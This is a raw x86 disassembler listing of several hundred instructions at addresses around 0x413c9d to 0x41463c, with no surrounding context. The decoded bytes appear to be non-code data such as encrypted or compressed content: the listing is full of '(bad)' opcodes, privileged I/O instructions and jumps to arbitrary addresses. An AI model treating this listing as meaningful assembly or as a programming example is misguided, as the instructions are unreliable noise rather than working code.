  413c9d:	jmp    FWORD PTR [eax-0x623bd6b4]
  413ca3:	mov    edi,0x85b94bdf
  413ca8:	xchg   ebx,eax
  413ca9:	cmp    al,0xc4
  413cab:	jle    0x413c84
  413cad:	push   ebx
  413cae:	dec    edx
  413caf:	ret    0x64f4
  413cb2:	dec    ebx
  413cb3:	push   0xe
  413cb5:	jbe    0x413c44
  413cb7:	fmulp  st(4),st
  413cb9:	jg     0x413c3b
  413cbb:	sub    al,0xa0
  413cbd:	sti    
  413cbe:	pop    edi
  413cbf:	inc    esi
  413cc0:	xchg   esi,eax
  413cc1:	adc    BYTE PTR [edx-0x43],dl
  413cc4:	jecxz  0x413d10
  413cc6:	jecxz  0x413cca
  413cc8:	ror    DWORD PTR [eax+0x23],0x36
  413ccc:	not    DWORD PTR [ebx+0x64369118]
  413cd2:	pop    ecx
  413cd3:	ss jb  0x413c97
  413cd6:	dec    ebx
  413cd7:	adc    eax,DWORD PTR [esi+0x2c51abc1]
  413cdd:	fst    QWORD PTR [ebp+0x2]
  413ce0:	push   eax
  413ce1:	das    
  413ce2:	mov    bh,BYTE PTR [ebp-0x73]
  413ce5:	fnstsw WORD PTR [esi-0x6ee01165]
  413ceb:	inc    edx
  413cec:	rcr    esi,cl
  413cee:	sub    al,0x82
  413cf0:	cmp    DWORD PTR [ebp-0x794df17d],esi
  413cf6:	pop    ss
  413cf7:	jns    0x413cb2
  413cf9:	jbe    0x413d31
  413cfb:	jbe    0x413d7b
  413cfd:	pop    ss
  413cfe:	fdiv   DWORD PTR [ecx-0x76]
  413d01:	mov    ecx,0xbc9b7c18
  413d06:	aam    0x7b
  413d08:	xchg   esp,eax
  413d09:	(bad)  
  413d0a:	sbb    ch,BYTE PTR [esp+ecx*2]
  413d0d:	mov    eax,0xbc8c04e4
  413d12:	lahf   
  413d13:	ror    BYTE PTR [ebx],1
  413d15:	rcl    ecx,1
  413d17:	es test ch,dl
  413d1a:	call   0x863f:0x9611ae6d
  413d21:	jl     0x413d06
  413d23:	push   esp
  413d24:	std    
  413d25:	and    eax,0x8d17a6b2
  413d2a:	dec    ebx
  413d2b:	push   esi
  413d2c:	cmp    DWORD PTR [ebx],0xffffffec
  413d2f:	jns    0x413cea
  413d31:	fnstcw WORD PTR [ebp+0x73]
  413d34:	dec    esp
  413d35:	cmp    bh,BYTE PTR [edi+0x28]
  413d38:	xchg   bl,dl
  413d3a:	adc    BYTE PTR [eax+edx*8],bl
  413d3d:	(bad)  
  413d3e:	loop   0x413d10
  413d40:	loop   0x413d86
  413d42:	xor    al,0x6f
  413d44:	scas   eax,DWORD PTR es:[edi]
  413d45:	cs ret 0x9460
  413d49:	mov    ecx,0xdf6802fa
  413d4e:	push   0xffffff9a
  413d50:	enter  0x867c,0xd7
  413d54:	das    
  413d55:	fld    DWORD PTR [esi]
  413d57:	je     0x413d57
  413d59:	pop    esi
  413d5a:	mov    ebp,0xfd4c641d
  413d5f:	xor    DWORD PTR [ecx+0x5d9326a1],esi
  413d65:	icebp  
  413d66:	pop    edi
  413d67:	cmp    DWORD PTR [eax],esi
  413d69:	aaa    
  413d6a:	lds    ecx,FWORD PTR [ebp+0x5fc1b663]
  413d70:	mov    dh,0xf2
  413d72:	jne    0x413da1
  413d74:	mov    ebp,0x29bb28d5
  413d79:	or     eax,0x23c7a465
  413d7e:	shr    DWORD PTR [ebx],0x4
  413d81:	int    0xa0
  413d83:	retf   0x3dad
  413d86:	test   BYTE PTR [eax],0xa2
  413d89:	iret   
  413d8a:	mov    esi,eax
  413d8c:	pop    edi
  413d8d:	push   0xacc943f1
  413d92:	cli    
  413d93:	outs   dx,DWORD PTR ds:[esi]
  413d94:	daa    
  413d95:	or     al,0x93
  413d97:	adc    ebp,0xffffff91
  413d9a:	push   0x3f1e7a65
  413d9f:	es xchg edi,eax
  413da1:	cli    
  413da2:	das    
  413da3:	call   0x957f31d4
  413da8:	xor    BYTE PTR [edx+0x51cec946],ah
  413dae:	push   edx
  413daf:	cmp    DWORD PTR [edx-0x4b445a11],0x53
  413db6:	out    0xf5,al
  413db8:	jmp    0xb1f3:0x5770afe1
  413dbf:	test   eax,0x4964f499
  413dc4:	in     eax,0x83
  413dc6:	push   esp
  413dc7:	sahf   
  413dc8:	data16 adc BYTE PTR [edx+ebp*8],0xee
  413dcd:	mov    ecx,0x557d94ff
  413dd2:	inc    esi
  413dd3:	sub    al,0x7e
  413dd5:	(bad)  
  413dd6:	fnstsw WORD PTR [ecx]
  413dd8:	int    0x91
  413dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ddb:	cmp    edi,edi
  413ddd:	and    edi,esp
  413ddf:	and    BYTE PTR [edx+0x6067a862],cl
  413de5:	das    
  413de6:	inc    ebp
  413de7:	push   ds
  413de8:	cli    
  413de9:	pop    eax
  413dea:	cmp    al,0x93
  413dec:	adc    BYTE PTR [eax+0x7c],bh
  413def:	add    BYTE PTR [ebp+0x53c63cc6],0xd1
  413df6:	ror    BYTE PTR [ebp+0x7f],1
  413df9:	inc    edx
  413dfa:	cld    
  413dfb:	jbe    0x413d9c
  413dfd:	sbb    al,0x11
  413dff:	jae    0x413e7c
  413e01:	(bad)  
  413e02:	aas    
  413e03:	jbe    0x413e71
  413e05:	and    ecx,eax
  413e07:	inc    edx
  413e08:	xor    dh,dh
  413e0a:	cmc    
  413e0b:	push   ebx
  413e0c:	sahf   
  413e0d:	es add al,0x44
  413e10:	xchg   ebp,eax
  413e11:	pop    ecx
  413e12:	and    bl,bl
  413e14:	jmp    0x413dde
  413e16:	cmc    
  413e17:	xchg   edx,eax
  413e18:	push   cs
  413e19:	test   al,0x67
  413e1b:	hlt    
  413e1c:	ret    
  413e1d:	nop
  413e1e:	ss dec eax
  413e20:	xor    cl,BYTE PTR [edi-0x1b]
  413e23:	imul   ebx,ebx,0xe
  413e26:	aad    0xf7
  413e28:	add    eax,0xee498278
  413e2d:	enter  0xc869,0xcf
  413e31:	fcmovnu st,st(2)
  413e33:	inc    eax
  413e34:	ds out dx,al
  413e36:	sbb    ebp,ebp
  413e38:	inc    esi
  413e39:	push   es
  413e3a:	sbb    ebx,ebx
  413e3c:	mov    eax,ds:0x99339726
  413e41:	push   cs
  413e42:	mov    BYTE PTR [esi-0x7c830cb1],dl
  413e48:	cmc    
  413e49:	out    0x83,eax
  413e4b:	ins    DWORD PTR es:[edi],dx
  413e4c:	scas   al,BYTE PTR es:[edi]
  413e4d:	pop    edi
  413e4e:	mov    ds:0x978a490c,al
  413e53:	test   BYTE PTR [ebx-0x5e],al
  413e56:	fidivr WORD PTR [eax]
  413e58:	loope  0x413ddb
  413e5a:	mov    ah,0x46
  413e5c:	mov    esi,0xee3ad48e
  413e61:	jo     0x413e78
  413e63:	push   cs
  413e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e65:	add    eax,DWORD PTR [edx+ecx*4]
  413e68:	gs or  eax,0x20babe00
  413e6e:	outs   dx,DWORD PTR ds:[esi]
  413e6f:	xchg   esi,eax
  413e70:	mov    eax,ds:0x398eb1f2
  413e75:	rcr    DWORD PTR [ebp+0x5c],1
  413e78:	add    BYTE PTR [ecx],ah
  413e7a:	jb     0x413ead
  413e7c:	sbb    eax,DWORD PTR [ecx]
  413e7e:	jg     0x413ea6
  413e80:	sub    eax,0xdfd6f530
  413e85:	inc    ecx
  413e86:	mov    ss,WORD PTR [edx]
  413e88:	in     eax,0x4f
  413e8a:	mov    al,ds:0x19e9574d
  413e8f:	out    0xc8,al
  413e91:	pop    es
  413e92:	imul   DWORD PTR [esi+0x18edaa00]
  413e98:	jne    0x413e9a
	...
  41406a:	add    BYTE PTR [eax],al
  41406c:	add    BYTE PTR [ebx+0x42],dl
  41406f:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  414076:	pop    eax
  414077:	cdq    
  414078:	shl    DWORD PTR [eax],0x48
  41407b:	(bad)
  41407e:	push   esp
  41407f:	add    DWORD PTR [eax],eax
  414081:	and    eax,0xdb000007
  414086:	fidivr WORD PTR [esi-0x7d]
  414089:	mov    esp,esp
  41408b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41408c:	jmp    0x4140db
  41408e:	(bad)  
  41408f:	icebp  
  414090:	mov    ds:0x4e81057f,eax
  414095:	add    DWORD PTR [edx-0x74],esp
  414098:	ret    0xc6b
  41409b:	cmp    eax,0xf0b859d7
  4140a0:	cmp    BYTE PTR ds:0xe7ad7a9d,bh
  4140a6:	out    dx,al
  4140a7:	push   esp
  4140a8:	cmp    BYTE PTR cs:[ebp+0x2f],dl
  4140ac:	or     dl,BYTE PTR fs:[ecx-0x31]
  4140b0:	jnp    0x414123
  4140b2:	addr16 sub bh,0x49
  4140b6:	add    bh,BYTE PTR [ecx+0x70e5c4e0]
  4140bc:	jnp    0x4140b2
  4140be:	mov    eax,ds:0xe64d9636
  4140c3:	stc    
  4140c4:	(bad)  
  4140c6:	punpcklbw mm6,mm5
  4140c9:	pop    es
  4140ca:	add    DWORD PTR [edx],ebp
  4140cc:	push   esi
  4140cd:	ds mov esi,0x68eb943c
  4140d3:	sti    
  4140d4:	je     0x414123
  4140d6:	jle    0x41412f
  4140d8:	mov    DWORD PTR [ebp+0x61],edx
  4140db:	and    dl,0xcc
  4140de:	neg    BYTE PTR [edx+0x1d8ca7c5]
  4140e4:	(bad)  
  4140e5:	mov    edi,0x7787b4e7
  4140ea:	xor    BYTE PTR [esi+0x31caccd9],ch
  4140f0:	fisttp QWORD PTR [ebp+0x51]
  4140f3:	jno    0x4140a8
  4140f5:	repnz imul esi,DWORD PTR [esi+0x5c],0xffffffb9
  4140fa:	or     cl,ah
  4140fc:	jae    0x414132
  4140fe:	cld    
  4140ff:	fild   DWORD PTR fs:[ebx+eax*1-0x6]
  414104:	pop    edx
  414105:	add    al,al
  414107:	dec    edx
  414108:	and    al,0x52
  41410a:	jo     0x4140be
  41410c:	pop    esi
  41410d:	cmp    BYTE PTR [eax],cl
  41410f:	inc    esi
  414110:	(bad)  
  414112:	push   esi
  414113:	mov    dl,0x31
  414115:	xchg   ecx,eax
  414116:	pop    ss
  414117:	scas   al,BYTE PTR es:[edi]
  414118:	in     al,0x55
  41411a:	fdivr  DWORD PTR [eax-0x35e340ec]
  414120:	push   es
  414121:	cmp    ah,BYTE PTR [esi]
  414123:	push   0x15a6ef5c
  414128:	or     eax,0x756b6664
  41412d:	adc    DWORD PTR [edi+0x4d7ff2bf],ebx
  414133:	and    eax,0xf3e73d8
  414138:	clc    
  414139:	dec    ebx
  41413a:	popf   
  41413b:	mov    bh,0xaf
  41413d:	in     eax,0xef
  41413f:	fistp  QWORD PTR [edx-0x21]
  414142:	jl     0x41413f
  414144:	in     eax,0x10
  414146:	pusha  
  414147:	jp     0x41416d
  414149:	fcmove st,st(4)
  41414b:	xor    dh,ch
  41414d:	or     BYTE PTR [ebx],0x95
  414150:	das    
  414151:	stos   DWORD PTR es:[edi],eax
  414152:	pop    edi
  414153:	jbe    0x4140ea
  414155:	add    ah,BYTE PTR [edi+0x6a]
  414158:	jae    0x4141d2
  41415a:	int3   
  41415b:	xchg   edi,eax
  41415c:	push   ebp
  41415d:	jbe    0x4141b3
  41415f:	xor    al,0x35
  414161:	enter  0xc4cc,0x19
  414165:	or     bl,BYTE PTR [ebp+0x6a3d3ef1]
  41416b:	hlt    
  41416c:	push   ebx
  41416d:	mov    DWORD PTR [ebx-0x255f4bc8],ebp
  414173:	(bad)  
  414175:	push   0xfffffff4
  414177:	mov    bh,0xc7
  414179:	cmp    eax,0x90642bec
  41417e:	ret    0x4858
  414181:	jb     0x4141be
  414183:	push   eax
  414184:	and    BYTE PTR [ebx+0x15],bh
  414187:	pusha  
  414188:	pushf  
  414189:	inc    eax
  41418a:	inc    ebp
  41418b:	shr    dh,1
  41418d:	xchg   edi,eax
  41418e:	hlt    
  41418f:	or     ch,al
  414191:	add    ah,BYTE PTR [esi+0x10]
  414194:	add    dl,BYTE PTR [ebp+0x1e32dc3]
  41419a:	jmp    0x96350098
  41419f:	ins    BYTE PTR es:[edi],dx
  4141a0:	mov    edx,DWORD PTR [esi+0x50]
  4141a3:	fisttp WORD PTR [eax]
  4141a5:	ret    0x45d
  4141a8:	sub    DWORD PTR [esi-0x692b50e3],0xc77b9f2
  4141b2:	add    DWORD PTR [edi],edx
  4141b4:	xor    edi,DWORD PTR [edx-0x31]
  4141b7:	sub    esi,DWORD PTR [ebp+0x3f]
  4141ba:	jl     0x4141d7
  4141bc:	mov    cl,0xcc
  4141be:	push   ds
  4141bf:	jmp    0x414153
  4141c1:	repnz dec edi
  4141c3:	imul   BYTE PTR ds:0xa93bb7b8
  4141c9:	xor    ch,BYTE PTR [esi-0x122f6a05]
  4141cf:	fs pop esp
  4141d1:	jge    0x41417c
  4141d3:	int    0x7b
  4141d5:	push   ss
  4141d6:	or     DWORD PTR [ecx+0x72cf381b],edi
  4141dc:	sub    DWORD PTR [edi-0x66a8554a],ecx
  4141e2:	mov    ds:0x88b93b4b,eax
  4141e7:	xlat   BYTE PTR ds:[ebx]
  4141e8:	pop    edi
  4141e9:	test   eax,0xcdbecb15
  4141ee:	mov    ah,0x11
  4141f0:	cli    
  4141f1:	aas    
  4141f2:	push   ds
  4141f3:	or     ch,BYTE PTR [edx]
  4141f5:	shr    BYTE PTR [edi-0x66],1
  4141f8:	ret    
  4141f9:	xchg   DWORD PTR [ebx+0x59],edi
  4141fc:	jl     0x414205
  4141fe:	xchg   edx,eax
  4141ff:	pop    edx
  414200:	xchg   DWORD PTR [edi],ebx
  414202:	and    BYTE PTR [esi],cl
  414204:	mov    ah,0xc3
  414206:	arpl   WORD PTR [edi+0x51],cx
  414209:	ret    0xbb5b
  41420c:	and    edi,DWORD PTR [edx+0x6f89984a]
  414212:	xor    dl,bl
  414214:	jbe    0x414202
  414216:	sub    al,0xac
  414218:	and    bh,cl
  41421a:	sbb    al,bl
  41421c:	sbb    BYTE PTR [ebx],bh
  41421e:	fs pop es
  414220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414221:	sub    al,0xf4
  414223:	shr    BYTE PTR [ebx-0xfa5bba5],1
  414229:	pop    edx
  41422a:	jb     0x41424d
  41422c:	mov    eax,ds:0x6380a5bb
  414231:	popa   
  414232:	pop    edi
  414233:	sub    ecx,DWORD PTR [edx-0x3a]
  414236:	jae    0x41429f
  414238:	or     al,0x79
  41423a:	mov    ds:0x76724030,al
  41423f:	cld    
  414240:	iret   
  414241:	imul   eax,edx,0x911e0132
  414247:	or     bl,BYTE PTR [ebx+0x14]
  41424a:	dec    ecx
  41424b:	ss cwde 
  41424d:	sub    al,0x79
  41424f:	xor    DWORD PTR [esi-0x2baa3ca3],ecx
  414255:	pop    esi
  414256:	push   edi
  414257:	pop    es
  414258:	dec    eax
  414259:	xor    ecx,DWORD PTR [esi-0x7869dcba]
  41425f:	sbb    al,0x2e
  414261:	les    edx,FWORD PTR [ecx+ecx*2+0x6d]
  414265:	fcmovu st,st(3)
  414267:	lods   al,BYTE PTR ds:[esi]
  414268:	xor    esp,DWORD PTR [esi+ebx*4]
  41426b:	mov    esi,0xbf943db3
  414270:	gs ss and eax,0x271a5332
  414277:	sbb    ebx,DWORD PTR [eax+ecx*1]
  41427a:	bound  ecx,QWORD PTR [ebp+esi*2-0x3287b57a]
  414281:	jmp    0x39526e04
  414286:	xchg   esp,eax
  414287:	mov    ah,0x3d
  414289:	mov    ch,0x49
  41428b:	data16 mov dh,0xc
  41428e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428f:	mov    DWORD PTR [edx-0x1c],edi
  414292:	dec    ebp
  414293:	mov    bl,0x72
  414295:	push   ss
  414296:	mov    ds,WORD PTR [ebx]
  414298:	ss pop esi
  41429a:	push   ds
  41429b:	mov    cs:0x2a8e757,al
  4142a1:	inc    edx
  4142a2:	mov    esi,0xdd90ac3a
  4142a7:	(bad)  
  4142a8:	push   esp
  4142aa:	das    
  4142ab:	in     al,dx
  4142ac:	pop    esi
  4142ad:	icebp  
  4142ae:	jge    0x414281
  4142b0:	jge    0x414254
  4142b2:	push   0xb8cf8531
  4142b7:	cs inc ebp
  4142b9:	sbb    BYTE PTR [esi+edi*2-0x2],ch
  4142bd:	xchg   edx,eax
  4142be:	(bad)  
  4142c0:	pop    esp
  4142c1:	gs mov dl,0x9c
  4142c4:	js     0x414304
  4142c6:	ja     0x414343
  4142c8:	lahf   
  4142c9:	cmp    ebx,DWORD PTR [esi-0x45]
  4142cc:	bound  edx,QWORD PTR [edx+esi*2]
  4142cf:	(bad)  
  4142d0:	mov    ebx,0x3f2623c6
  4142d5:	jb     0x414331
  4142d7:	(bad)  
  4142d8:	rcl    DWORD PTR [edi],cl
  4142da:	jl     0x41433c
  4142dc:	xchg   esp,eax
  4142dd:	push   esi
  4142de:	pop    es
  4142df:	stc    
  4142e0:	xor    bh,BYTE PTR [ebx+0x34]
  4142e3:	sub    esp,DWORD PTR [edx]
  4142e5:	bound  ebp,QWORD PTR [ebx-0x6e]
  4142e8:	xchg   ebx,eax
  4142e9:	jl     0x41427b
  4142eb:	dec    ebp
  4142ec:	inc    ecx
  4142ed:	pop    ebx
  4142ee:	and    eax,0xd3d93782
  4142f3:	xchg   edx,eax
  4142f4:	out    dx,eax
  4142f5:	mov    eax,esp
  4142f7:	sub    ecx,DWORD PTR [ecx+0x48]
  4142fa:	test   eax,0x178180eb
  4142ff:	jmp    0x414293
  414301:	jmp    0xe86dc7e
  414306:	push   edi
  414307:	mov    ecx,0xb149ae51
  41430c:	sub    al,0xd9
  41430e:	and    eax,eax
  414310:	inc    ecx
  414311:	push   ecx
  414312:	lods   al,BYTE PTR ds:[esi]
  414313:	test   eax,0x14fb6eba
  414318:	lock cmp edx,DWORD PTR [edx]
  41431b:	dec    esp
  41431c:	adc    BYTE PTR [ebx-0x79],0xd4
  414320:	xchg   BYTE PTR [edx+0x3bd65ccd],bh
  414326:	jbe    0x4142f1
  414328:	int3   
  414329:	lea    ebp,[ebx+0x72]
  41432c:	push   eax
  41432d:	cli    
  41432e:	mov    ds:0xd0e5e4f7,al
  414333:	sub    BYTE PTR [ecx+0x2c],ch
  414336:	xchg   esi,eax
  414337:	aad    0x1a
  414339:	sub    eax,0x2caae984
  41433e:	aas    
  41433f:	jbe    0x4142f8
  414341:	leave  
  414342:	pop    edi
  414343:	outs   dx,DWORD PTR ds:[esi]
  414344:	jl     0x4142da
  414346:	push   0xfffffffa
  414348:	dec    edx
  414349:	push   ds
  41434a:	mov    WORD PTR [esp+esi*4+0x15d4b845],ss
  414351:	inc    esp
  414352:	add    DWORD PTR [esp+edi*1+0xc452693],ebp
  414359:	fcom   QWORD PTR [esi-0x63befc97]
  41435f:	std    
  414360:	(bad)  
  414361:	dec    ebp
  414362:	cmp    bl,BYTE PTR [esi-0x732620b8]
  414368:	jns    0x4143d0
  41436a:	xlat   BYTE PTR ds:[ebx]
  41436b:	div    DWORD PTR [ebx]
  41436d:	dec    BYTE PTR [edx+0x6d]
  414370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414371:	mov    al,ds:0xa00f8acd
  414376:	stos   BYTE PTR es:[edi],al
  414377:	sbb    eax,0x4ed5c3d3
  41437c:	push   edi
  41437d:	add    BYTE PTR [edi],0xdb
  414380:	dec    esi
  414381:	pop    ebx
  414382:	ret    0x14fa
  414385:	push   0xffffffdf
  414387:	xchg   ecx,edi
  414389:	push   ebx
  41438a:	out    dx,al
  41438b:	and    eax,0xbe42d963
  414390:	and    eax,0xd1b108f
  414395:	(bad)  
  414396:	out    0x5b,al
  414398:	lds    edi,FWORD PTR ds:0x77346166
  41439e:	add    cl,al
  4143a0:	mov    BYTE PTR [esi-0x22],al
  4143a3:	cmp    al,0xa0
  4143a5:	jo     0x414338
  4143a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a8:	dec    esp
  4143a9:	xchg   ebp,eax
  4143aa:	inc    esp
  4143ab:	or     al,0xdb
  4143ad:	adc    al,0x24
  4143af:	loop   0x4143ea
  4143b1:	aaa    
  4143b2:	cmp    ebx,DWORD PTR [ecx-0x8]
  4143b5:	mov    esp,DWORD PTR [edi]
  4143b7:	rcr    DWORD PTR [ebx],1
  4143b9:	and    bl,cl
  4143bb:	ss lahf 
  4143bd:	int3   
  4143be:	xor    BYTE PTR [eax],dh
  4143c0:	ss mov esi,0x99e52d4c
  4143c6:	into   
  4143c7:	stos   BYTE PTR es:[edi],al
  4143c8:	loop   0x4143ab
  4143ca:	jle    0x4143e6
  4143cc:	jle    0x414442
  4143ce:	xchg   edi,eax
  4143cf:	call   0x70fc:0x6b4f91b5
  4143d6:	mov    BYTE PTR [ebx+edx*2+0x31ca393e],dl
  4143dd:	pop    ebp
  4143de:	inc    edx
  4143df:	rol    BYTE PTR [edi-0xe],cl
  4143e2:	jecxz  0x41440f
  4143e4:	out    0x42,al
  4143e6:	push   ebp
  4143e7:	jle    0x41438f
  4143e9:	neg    BYTE PTR ds:0x5dd68e57
  4143ef:	sub    BYTE PTR ds:0xb7294647,bl
  4143f5:	inc    edx
  4143f6:	imul   esi,DWORD PTR [ebp-0x8],0xffffffc0
  4143fa:	sub    BYTE PTR [eax+0x343cfdb5],cl
  414400:	mov    esi,0xa6ef116c
  414405:	mov    al,ds:0x59d1d16a
  41440a:	and    eax,0x4468afaf
  41440f:	push   edi
  414410:	push   ds
  414411:	cmp    DWORD PTR [edi-0x5ce80296],ebp
  414417:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414419:	adc    BYTE PTR [eax],0xa5
  41441c:	(bad)  
  41441d:	test   bl,ch
  41441f:	xor    al,0x73
  414421:	jnp    0x414419
  414423:	dec    esp
  414424:	mov    WORD PTR [edi+0x4f],cs
  414427:	(bad)  
  414428:	dec    ebx
  414429:	pop    edi
  41442a:	outs   dx,BYTE PTR ds:[esi]
  41442b:	jp     0x414454
  41442d:	xchg   ecx,eax
  41442e:	ror    esp,1
  414430:	or     DWORD PTR [esi],0x7c273e76
  414436:	mov    fs,edx
  414438:	out    dx,al
  414439:	int    0xeb
  41443b:	scas   al,BYTE PTR es:[edi]
  41443c:	mov    dl,0x9c
  41443e:	xor    DWORD PTR [ebx-0x1],ecx
  414441:	xchg   esi,eax
  414442:	daa    
  414443:	sub    ebp,edx
  414445:	xchg   edi,eax
  414446:	int    0x76
  414448:	mov    BYTE PTR [edx+0xd],0xd
  41444c:	jo     0x4144bc
  41444e:	mov    ah,0xf8
  414450:	in     eax,dx
  414451:	pop    es
  414452:	cld    
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	fst    DWORD PTR [esi-0x1071dc75]
  41445a:	sub    edi,DWORD PTR [esi-0x65]
  41445d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41445e:	push   ds
  41445f:	add    edx,0x55b78d18
  414465:	mov    bl,0x50
  414467:	aad    0x21
  414469:	dec    edi
  41446a:	mov    ebp,0xf6c04dc6
  41446f:	sbb    BYTE PTR [ebp+0x5b],0x46
  414473:	inc    ebp
  414474:	dec    ebx
  414475:	leave  
  414476:	xchg   BYTE PTR [esi+0x44],ch
  414479:	sub    DWORD PTR [ecx+eiz*4-0x5c],edi
  41447d:	add    edi,DWORD PTR [ebx-0x33]
  414480:	xchg   ecx,eax
  414481:	adc    esp,DWORD PTR [edi+0x28]
  414484:	pop    esp
  414485:	cmp    DWORD PTR [ebp-0x28],esp
  414488:	cmp    al,0x8d
  41448a:	fs ret 0x1d14
  41448e:	push   edi
  41448f:	add    BYTE PTR [eax+0xc],ch
  414492:	sub    al,0xd
  414494:	outs   dx,BYTE PTR ds:[esi]
  414495:	or     dl,BYTE PTR [eax+0x30]
  414498:	hlt    
  414499:	inc    esi
  41449a:	jne    0x4144d5
  41449c:	adc    DWORD PTR [ecx],0x34fc79f1
  4144a2:	adc    BYTE PTR [eax-0x77],bl
  4144a5:	or     edi,DWORD PTR [esi-0x272a6e45]
  4144ab:	imul   edx,ecx,0x9341f7cf
  4144b1:	or     al,0xcc
  4144b3:	loop   0x4144a1
  4144b5:	call   0xc35b:0x46b3ea38
  4144bc:	popa   
  4144bd:	enter  0x9985,0xe6
  4144c1:	cmc    
  4144c2:	ss pop edx
  4144c4:	outs   dx,DWORD PTR ds:[esi]
  4144c5:	daa    
  4144c6:	hlt    
  4144c7:	dec    ecx
  4144c8:	stos   DWORD PTR es:[edi],eax
  4144c9:	xlat   BYTE PTR ds:[ebx]
  4144ca:	(bad)  
  4144cb:	inc    DWORD PTR [edi-0xb]
  4144ce:	jle    0x41449e
  4144d0:	popf   
  4144d1:	test   DWORD PTR [esi],ecx
  4144d3:	pop    ecx
  4144d4:	pop    esp
  4144d5:	sbb    edx,DWORD PTR [eax]
  4144d7:	adc    BYTE PTR [edi],0x1d
  4144da:	cmc    
  4144db:	dec    edx
  4144dc:	cmp    ebx,DWORD PTR [eax+0xc540595]
  4144e2:	mov    bl,0x2c
  4144e4:	sbb    esp,eax
  4144e6:	or     edx,DWORD PTR [esi+0x1a58953f]
  4144ec:	mov    ebp,0xa6928ba6
  4144f1:	push   0x99f149d2
  4144f6:	add    dl,cl
  4144f8:	loope  0x4144ef
  4144fa:	xor    DWORD PTR [edi],ebp
  4144fc:	add    eax,0x8501ae6c
  414501:	push   DWORD PTR [ebx-0x64]
  414504:	sub    bh,dl
  414506:	xor    esi,ebp
  414508:	adc    eax,0x74b55da8
  41450d:	mov    WORD PTR [esi],cs
  41450f:	pop    esp
  414510:	mov    ebx,0x867f1071
  414515:	(bad)  
  414516:	retf   0xb34d
  414519:	and    al,0x9a
  41451b:	pop    eax
  41451c:	jno    0x4144b6
  41451e:	mov    bl,0x75
  414520:	mov    ds:0xf4fb6c0c,al
  414525:	jp     0x4144db
  414527:	add    dl,dl
  414529:	lahf   
  41452a:	mov    cl,0x4d
  41452c:	sbb    eax,0xaf6c3a60
  414531:	push   edx
  414532:	push   edx
  414533:	in     ax,dx
  414535:	iret   
  414536:	pushf  
  414537:	push   ebp
  414538:	das    
  414539:	ja     0x41458b
  41453b:	aas    
  41453c:	enter  0xa6,0x60
  414540:	inc    edx
  414541:	sbb    BYTE PTR [esi+0x461edeb],0xfc
  414548:	repz push ecx
  41454a:	mov    ch,0xc0
  41454c:	push   edi
  41454d:	pop    eax
  41454e:	jns    0x4145ad
  414550:	add    DWORD PTR [edi-0x7d0c8c29],ebx
  414556:	sub    al,0x75
  414558:	dec    esp
  414559:	stc    
  41455a:	repnz mov BYTE PTR [edi+0x33],bh
  41455e:	jmp    0xb8d2:0xba123c41
  414565:	pop    ebx
  414566:	cmp    dl,BYTE PTR [ebp-0x5443f6fd]
  41456c:	inc    esi
  41456d:	jns    0x414534
  41456f:	les    edx,FWORD PTR [ebp+0x6534d629]
  414575:	mov    bh,0x75
  414577:	and    eax,0x1c81228c
  41457c:	aam    0x45
  41457e:	and    eax,0xc71851cc
  414583:	xor    BYTE PTR [ecx],dh
  414585:	mov    bl,0xad
  414587:	pop    eax
  414588:	jmp    0xe55cbe79
  41458d:	loope  0x4145d8
  41458f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414590:	push   esi
  414591:	scas   al,BYTE PTR es:[edi]
  414592:	and    eax,0xcb939cb4
  414597:	clc    
  414598:	xor    eax,0x4cfd9f46
  41459d:	or     eax,0x2973ca92
  4145a2:	outs   dx,BYTE PTR ds:[esi]
  4145a3:	lock xlat BYTE PTR ds:[ebx]
  4145a5:	adc    dl,dl
  4145a7:	mov    ds:0x88234054,eax
  4145ac:	sub    BYTE PTR [edx-0x68],bl
  4145af:	cmp    al,0xf9
  4145b1:	test   al,0x43
  4145b3:	jge    0x4145df
  4145b5:	ficom  WORD PTR ds:0x157a566d
  4145bb:	ficomp DWORD PTR [esp+eiz*8-0x5d]
  4145bf:	call   0x873ce8c
  4145c4:	outs   dx,BYTE PTR ds:[esi]
  4145c5:	cmp    ah,bl
  4145c7:	mov    dl,0x51
  4145c9:	xchg   ecx,eax
  4145ca:	loope  0x41458b
  4145cc:	cmp    eax,DWORD PTR [ebp+0x79]
  4145cf:	cmp    al,0x50
  4145d1:	cmp    BYTE PTR [ebp+0x59],0x3f
  4145d5:	in     eax,0x86
  4145d7:	dec    ebp
  4145d8:	repz imul esi,edi,0x9d1a81c2
  4145df:	xor    al,0xd5
  4145e1:	mov    bl,0x3c
  4145e3:	sub    al,0xb
  4145e5:	dec    ebx
  4145e6:	int    0xfc
  4145e8:	daa    
  4145e9:	pop    ss
  4145ea:	mov    bh,0x8b
  4145ec:	inc    eax
  4145ed:	sub    DWORD PTR [edi+0x17ff1a43],esi
  4145f3:	or     BYTE PTR [edx+0x3faa93d9],ah
  4145f9:	push   ds
  4145fa:	jns    0x41462b
  4145fc:	push   es
  4145fd:	pop    ds
  4145fe:	ja     0x4145bd
  414600:	sub    BYTE PTR [ecx+0x72cce10a],bh
  414606:	cwde   
  414607:	fst    st(2)
  414609:	dec    esi
  41460a:	out    0x4d,al
  41460c:	cmp    bl,BYTE PTR [edi+edx*8+0x14f6e99c]
  414613:	mov    bl,0x41
  414615:	cmc    
  414616:	inc    esi
  414617:	xchg   esi,eax
  414618:	xchg   ecx,eax
  414619:	call   0xc0cad682
  41461e:	outs   dx,BYTE PTR ds:[esi]
  41461f:	jnp    0x4145f7
  414621:	jecxz  0x41464c
  414623:	inc    ebx
  414624:	sti    
  414625:	mov    edx,0x89fd480
  41462a:	fcom   QWORD PTR [edi+0x10]
  41462d:	sbb    DWORD PTR [ecx+0x3becae0f],ebp
  414633:	retf   0x5b45
  414636:	push   cs
  414637:	mov    edx,ecx
  414639:	ins    DWORD PTR es:[edi],dx
  41463a:	jne    0x41465c
  41463c:	dec    edx
